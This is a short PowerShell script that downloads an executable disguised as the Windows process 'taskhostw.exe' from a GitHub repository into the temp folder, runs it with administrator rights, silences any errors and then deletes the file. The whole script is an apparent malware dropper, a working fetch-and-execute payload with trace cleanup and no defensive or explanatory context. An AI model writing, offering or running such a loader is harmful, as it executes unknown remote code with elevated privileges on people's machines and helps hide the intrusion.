$exeUrl = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/taskhostw.exe"
$tempPath = "$env:TEMP\taskhostw.exe"

function Clean-Up {
    if (Test-Path $tempPath) {
        Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
    }
}

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -ErrorAction Stop

    if (Test-Path $tempPath) {
        Start-Process -FilePath $tempPath -Verb RunAs -Wait
    }
}
catch {
    # Error occurred
}
finally {
    Clean-Up
}
